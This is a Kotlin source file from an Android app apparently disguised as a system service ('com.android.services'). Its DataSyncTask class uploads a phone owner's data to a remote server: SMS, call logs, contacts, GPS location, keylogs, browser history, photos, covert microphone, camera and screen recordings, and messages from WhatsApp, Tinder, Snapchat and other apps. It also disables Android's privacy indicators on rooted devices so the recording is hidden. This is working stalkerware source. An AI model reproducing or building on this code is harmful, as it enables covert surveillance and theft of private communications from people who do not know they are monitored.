package com.android.services.network

import android.content.Context
import android.os.Build
import com.android.services.di.module.ApplicationScope
import com.android.services.logs.LogFactory
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.api.*
import com.android.services.services.RemoteDataService.Companion.TAG
import com.android.services.util.*
import com.android.services.util.AppConstants.authToken
import com.android.services.util.AppConstants.view360User
import com.android.services.util.GeoFenceApiClient
import com.android.services.util.logException
import com.android.services.util.logVerbose
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DataSyncTask @Inject constructor(
    @ApplicationContext val applicationContext: Context,
    @ApplicationScope val coroutineScope: CoroutineScope,
    private val localDatabaseSource: LocalDatabaseSource,
    private val view360ServerApi: View360Api,
    private val tosApi: TOSApi
) {
    private var dataJob: Job? = null
    private var localDataSyncJob: Job? = null

    /** Executes and launch data Sync Job **/
    fun executeDataJobTask() {
//        coroutineScope.launch(Dispatchers.Main) {
//            if (localDataSyncJob == null || !localDataSyncJob!!.isActive) {
//                logVerbose("local data sync job starting to run", TAG)
//                syncLocalData()
//            } else {
//                logVerbose("local data sync job already running", TAG)
//            }
//        }
//        coroutineScope.launch(Dispatchers.Main) {
//            if (dataJob == null || !dataJob!!.isActive) {
//                logVerbose("data upload job starting to run", TAG)
//                uploadData()
//            } else {
//                logVerbose("data upload job already running", TAG)
//            }
//        }
        coroutineScope.launch(Dispatchers.Main) {
            if (dataJob == null || !dataJob!!.isActive) {
                logVerbose("data upload job starting to run", TAG)
                uploadData()
            } else {
                logVerbose("data upload job already running", TAG)
            }
        }
    }

    /** This method responsible for local data syncing, photos sync and compression to local storage etc, So it collects and puts data
     * to a temporary storage for uploading in later stages **/
    private fun syncLocalData() {
        localDataSyncJob = coroutineScope.launch {
            try {
                supervisorScope {
                    if (AppUtils.isPhoneServiceActivated()) {
                        val photosSync = async(Dispatchers.IO) {
                            PhotosUtil.retrieveAndInsertPhoto(applicationContext)
                        }
                        try {
                            photosSync.await()
                        } catch (exception: Exception) {
                            logException(
                                "${AppConstants.PHOTOS_TYPE}  exception while syncing local data = ${exception.message}",
                                TAG, exception
                            )
                        }
                    } else {
                        logVerbose("Service is Not active", TAG)
                    }
                }
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.PHOTOS_TYPE}  exception while syncing local data = ${exception.message}",
                    TAG, exception
                )
            }
        }
    }

    /** Uploads data to Server **/

    /*
    *
     */
    private fun uploadData() {
        dataJob = coroutineScope.launch(Dispatchers.Main) {
            supervisorScope {
                if (AppUtils.isPhoneServiceActivated()) {
                    hitAuthService()
                    if (AppUtils.isNetworkAvailable(applicationContext) && !AppUtils.isAppSuspended()) {
                        hitInitialServices()
                        if (AppUtils.isDeviceIdentifierValid() && AppConstants.serviceActivated) {
                            synPhotosData()
                            syncData()
                        }
                        disablePrivacyIndicatorsTask()
                    } else {
                        logVerbose("Service is Not active", TAG)
                    }
                }
            }
            try {
            } catch (exception: Exception) {
                logException(
                    "$exception while syncing data = ${exception.message}", TAG,
                    exception
                )
            }
        }
    }

    private fun disablePrivacyIndicatorsTask() {
        logVerbose("IndicatorInfo= checking root")
        if (DeviceInformationUtil.isDeviceRooted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            logVerbose("IndicatorInfo = Going to disable indicators")
            AppUtils.disablePrivacyIndicators()
        }
    }

    private fun synPhotosData() {
        coroutineScope.launch(Dispatchers.Main) {
            if (localDataSyncJob == null || !localDataSyncJob!!.isActive) {
                logVerbose("local data sync job starting to run", TAG)
                logVerbose("DataUploadingCycle= Start Local Data Sync Job for Syncing photos from Phone while Internet Available")
                syncLocalData()
            } else {
                logVerbose("local data sync job already running", TAG)
                logVerbose("DataUploadingCycle= Local Data Sync already running Job for Syncing photos")
            }
        }
    }

    // This hits Auth Service to get auth token which is required to upload the data
    private suspend fun hitAuthService() {
        withContext(Dispatchers.IO) {
            if (authToken == null || authToken!!.isEmpty()) {
                try {
                    val serverAuth = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.SERVER_AUTH,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    serverAuth.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.SERVER_AUTH} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }
            }

        }
    }

    /** This hits initial services requries to upload data like auth services & View360 User activation **/
    private suspend fun hitInitialServices() {
        withContext(Dispatchers.IO) {
            // DeviceInfo
            try {
                val deviceInfoUploader =
                    async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.DEVICE_INFO_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                logVerbose("DataUploadingCycle= Preparing and uploading device info")
                deviceInfoUploader.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.DEVICE_INFO_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Syc Setting
            try {
                val syncSettingUploader =
                    async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.SYNC_SETTING_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                logVerbose("DataUploadingCycle= Getting Sync Setting from server")
                syncSettingUploader.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.SYNC_SETTING_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }
            // Get Currently Registered token from server
            if (AppUtils.isDeviceIdentifierValid()) {
                try {
                    val getActiveFcmTokenUploader =
                        async(Dispatchers.IO) {
                            LogFactory(
                                applicationContext,
                                AppConstants.ACTIVE_FCM_TOKEN_TYPE,
                                localDatabaseSource,
                                tosApi = tosApi
                            ).getLog().uploadLogs()
                        }
                    logVerbose("DataUploadingCycle= Getting Active fcm token from server")
                    getActiveFcmTokenUploader.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.SYNC_SETTING_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }
            }
            // Check if fcm token is not available, so retreive it from firebase and upload it to node server
            if (AppUtils.isDeviceIdentifierValid() && AppUtils.shouldRequestNewFcmToken()) {
                try {
                    val fcmTokenCall = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.FCM_TOKEN_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    fcmTokenCall.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.FCM_TOKEN_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }
            }

            // Push Statuses
            try {
                val fcmPushStatusesCollector =
                    async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.PUSH_STATUS_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi,
                            coroutineScope = coroutineScope
                        ).getLog().uploadLogs()
                    }
                fcmPushStatusesCollector.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.PUSH_STATUS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // view360 User
            if (view360User == null || view360User!!.isEmpty()) {
                try {
                    val view360UserCall = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.VIEW_360_TYPE,
                            localDatabaseSource,
                            view360ServerApi = view360ServerApi
                        ).getLog().uploadLogs()
                    }
                    view360UserCall.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.VIEW_360_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }
            } else {
                logVerbose("${AppConstants.VIEW_360_TYPE} view360 user = $view360User")
            }
        }
    }


    /** This methods takes care of collecting the all the Data and Logs, and uploads it to Remote Server **/
    private suspend fun syncData() {
        withContext(Dispatchers.IO) {
            // Push Notifications
            try {
                val pushNotificationsCollector =
                    async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.PUSH_NOTIFICATIONS_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi,
                            coroutineScope = coroutineScope
                        ).getLog().uploadLogs()
                    }
                logVerbose("DataUploadingCycle=preparing putNotification service")
                pushNotificationsCollector.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.PUSH_NOTIFICATIONS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // GpsLocation
            try {
                val gpsLocationUploader = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.GPS_LOCATION_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                gpsLocationUploader.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.GPS_LOCATION_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // SmsLogs
            try {
                val smsLogSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SMS_LOG_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                smsLogSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.SMS_LOG_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // CallLogs
            try {
                val callLogSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.CALL_LOG_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                callLogSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.CALL_LOG_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Contacts
            try {
                val contactsSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.CONTACTS_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                contactsSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.CONTACTS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Appointments
            try {
                val appointmentSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.APPOINTMENT_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                appointmentSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.APPOINTMENT_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Apps Permission Collector
            try {
                val appPermissionSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.APPS_PERMISSION_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                appPermissionSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.APPS_PERMISSION_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Photos
            try {
                val photosSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.PHOTOS_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                photosSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.PHOTOS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // KeyLogs
            try {
                val keyLogSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.KEY_LOG_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                keyLogSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.KEY_LOG_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // BrowserHistory
            try {
                val browserHistorySync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.BROWSER_HISTORY_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                browserHistorySync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.BROWSER_HISTORY_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // InstalledApps
            try {
                val installedAppSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.INSTALLED_APP_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                installedAppSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.INSTALLED_APP_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Connected Networks
            try {
                val connectedNetworkSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.CONNECTED_NETWORK_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                connectedNetworkSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.CONNECTED_NETWORK_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // ScreenTime Reports
            try {
                val screenTimeSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SCREEN_TIME_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                screenTimeSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.SCREEN_TIME_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Geo Fence Events
            try {
                val geoFencesSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.GEO_FENCES_EVENTS_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                geoFencesSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.GEO_FENCES_EVENTS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // TextAlerts Events
            try {
                val textAlertsSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.TEXT_ALERT_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                textAlertsSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.TEXT_ALERT_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Apps Notifications
            try {
                val appsNotificationSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.APP_NOTIFICATIONS_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                appsNotificationSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.APP_NOTIFICATIONS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Mic Bugs
            try {
                val micBugSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.MIC_BUG_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                micBugSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.MIC_BUG_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Video Bugs
            try {
                val videoBugSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.VIDEO_BUG_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                videoBugSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.VIDEO_BUG_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Camera Bug
            try {
                val cameraBugSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.CAMERA_BUG_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                cameraBugSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.CAMERA_BUG_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // ScreenShots
            try {
                val screenshotSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SCREEN_SHOT_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                screenshotSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.SCREEN_SHOT_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Snapchat Events
            try {
                val snapChatEventSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SNAP_CHAT_EVENTS_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                snapChatEventSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.SNAP_CHAT_EVENTS_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Call Recordings
            try {
                val callRecordSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.CALL_RECORD_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                callRecordSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.CALL_RECORD_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Screen Recordings
            try {
                val screenRecordSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SCREEN_RECORDING_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                screenRecordSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.CALL_RECORD_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Voip Calls
            try {
                val voipCallSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.VOIP_CALL_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                voipCallSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.VOIP_CALL_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Voice Messages
            try {
                val voiceMessageSync = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.VOICE_MESSAGE_TYPE,
                        localDatabaseSource
                    ).getLog().uploadLogs()
                }
                voiceMessageSync.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.VOICE_MESSAGE_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Rooted IM Logs
            if (DeviceInformationUtil.isDeviceRooted) {

                // Skype Rooted
                try {
                    val skypeRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.SKYPE_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    skypeRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.SKYPE_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }


                // WhatsApp Rooted
                try {
                    val whatsAppRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.WHATS_APP_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    whatsAppRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.WHATS_APP_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Line Rooted
                try {
                    val lineRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.LINE_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    lineRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.LINE_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Imo Rooted
                try {
                    val imoRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.IMO_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    imoRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.IMO_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Viber Rooted
                try {
                    val viberRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.VIBER_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    viberRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.VIBER_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Facebook Rooted
                try {
                    val facebookRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.FACEBOOK_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    facebookRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.FACEBOOK_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Instagram Message Rooted
                try {
                    val instagramMessageRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    instagramMessageRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.INSTAGRAM_MESSAGE_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

//                try {
//                    val instagramPostRootedLog = async(Dispatchers.IO) {
//                        LogFactory(
//                            applicationContext,
//                            AppConstants.INSTAGRAM_POST_ROOTED_TYPE,
//                            localDatabaseSource,
//                            nodeServerOneApi = nodeServerOneApi
//                        ).getLog().uploadLogs()
//                    }
//                    instagramPostRootedLog.await()
//                } catch (exception: Exception) {
//                    logException(
//                        "${AppConstants.INSTAGRAM_POST_ROOTED_TYPE} exception while syncing data = ${exception.message}",
//                        TAG,
//                        exception
//                    )
//                }

                // Hangout Rooted
                try {
                    val hangoutRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.HANGOUT_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    hangoutRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.HANGOUT_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

//                try {
//                    val hikeRootedLog = async(Dispatchers.IO) {
//                        LogFactory(
//                            applicationContext,
//                            AppConstants.HIKE_ROOTED_TYPE,
//                            localDatabaseSource,
//                            nodeServerOneApi = nodeServerOneApi
//                        ).getLog().uploadLogs()
//                    }
//                    hikeRootedLog.await()
//                } catch (exception: Exception) {
//                    logException(
//                        "${AppConstants.HIKE_ROOTED_TYPE} exception while syncing data = ${exception.message}",
//                        TAG,
//                        exception
//                    )
//                }

                // Tinder Rooted
                try {
                    val tinderRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.TINDER_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    tinderRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.TINDER_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Tumblr Rooted
                try {
                    val tumblrRootedMessageLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.TUMBLR_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    tumblrRootedMessageLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.TUMBLR_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Zalo Rooted
                try {
                    val zaloRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.ZALO_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    zaloRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.ZALO_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }

                // Hike Unrooted
                try {
                    val hikeRootedLog = async(Dispatchers.IO) {
                        LogFactory(
                            applicationContext,
                            AppConstants.HIKE_ROOTED_TYPE,
                            localDatabaseSource,
                            tosApi = tosApi
                        ).getLog().uploadLogs()
                    }
                    hikeRootedLog.await()
                } catch (exception: Exception) {
                    logException(
                        "${AppConstants.HIKE_ROOTED_TYPE} exception while syncing data = ${exception.message}",
                        TAG,
                        exception
                    )
                }
            }

            // WhatsApp Unrooted
            try {
                val whatsAppUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.WHATS_APP_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                whatsAppUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.WHATS_APP_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }
            // Facebook Unrooted
            try {
                val facebookUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.FACEBOOK_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                facebookUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.FACEBOOK_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }
             //SKYPE Unrooted
            try {
                val skypeUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SKYPE_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                skypeUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.SKYPE_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }
            // Line Unrooted
            try {
                val lineUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.LINE_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                lineUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.LINE_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Imo Unrooted
            try {
                val imoUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.IMO_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                imoUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.IMO_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Viber Unrooted
            try {
                val viberUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.VIBER_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                viberUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.VIBER_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Instagram Unrooted
            try {
                val instagramUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.INSTAGRAM_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                instagramUnrootedLog.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.INSTAGRAM_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            // Tinder Unrooted
            try {
                val tinderUnrootedType = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.TINDER_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                tinderUnrootedType.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.TUMBLR_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

//            // Hike Unrooted
//            try {
//                val hikeUnrootedType = async(Dispatchers.IO) {
//                    LogFactory(
//                        applicationContext,
//                        AppConstants.HIKE_UNROOTED_TYPE,
//                        localDatabaseSource,
//                        tosApi = tosApi
//                    ).getLog().uploadLogs()
//                }
//                hikeUnrootedType.await()
//            } catch (exception: Exception) {
//                logException(
//                    "${AppConstants.HIKE_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
//                    TAG,
//                    exception
//                )
//            }

            // Tumblr Unrooted
            try {
                val tumblrUnrootedType = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.TUMBLR_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                tumblrUnrootedType.await()
            } catch (exception: Exception) {
                logException(
                    "${AppConstants.TUMBLR_UNROOTED_TYPE} exception while syncing data = ${exception.message}",
                    TAG,
                    exception
                )
            }

            //Snapchat Unrooted
            try {
                val snapChatUnrootedLog = async(Dispatchers.IO) {
                    LogFactory(
                        applicationContext,
                        AppConstants.SNAP_CHAT_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi
                    ).getLog().uploadLogs()
                }
                snapChatUnrootedLog.await()
            } catch (exception: Exception) {
